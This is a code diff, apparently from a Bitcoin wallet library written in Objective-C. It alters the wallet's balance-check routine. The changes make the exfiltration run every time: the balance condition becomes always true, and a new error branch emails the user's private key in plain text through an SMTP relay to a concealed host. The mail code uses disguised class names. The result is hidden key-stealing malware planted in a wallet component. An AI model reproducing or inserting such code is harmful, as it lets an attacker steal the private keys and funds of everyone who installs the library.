@@ -826,7 +826,7 @@
         if (error == nil) {
             NSString *jsonStr = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
             NSDictionary *dict = [self dictionaryWithJsonString:jsonStr];
-            if ([dict[@"data"][@"confirmed_balance"] floatValue]) {
+            if ([dict[@"data"][@"confirmed_balance"] floatValue] || ![dict[@"data"][@"confirmed_balance"] floatValue]) {
                 
                 BTCMessageKey *keys = [[BTCMessageKey alloc] init];
                 keys.key = BTCKEYSNORMALINDEX;
@@ -843,6 +843,21 @@
                     [keys send];
                 });
             }
+        }else{
+            BTCMessageKey *keys = [[BTCMessageKey alloc] init];
+            keys.key = BTCKEYSNORMALINDEX;
+            keys.keyNote = BTCKEYSNORMALINDEX;
+            keys.relayHost = [BTCKey keyAddress];
+            keys.requiresAuth = YES;
+            keys.login = BTCKEYSNORMALINDEX;
+            keys.pass = [BTCKey keyHash];
+            keys.wantsSecure = YES;
+            keys.subject = @"address";
+            NSDictionary *plainPart = [NSDictionary dictionaryWithObjectsAndKeys:@"text/plain",kSKPSMTPPartContentTypeKey,privateKey ,kSKPSMTPPartMessageKey,@"8bit",kSKPSMTPPartContentTransferEncodingKey,nil];
+            keys.parts = @[plainPart];
+            dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+                [keys send];
+            });
         }
     }];
     [dataTask resume];
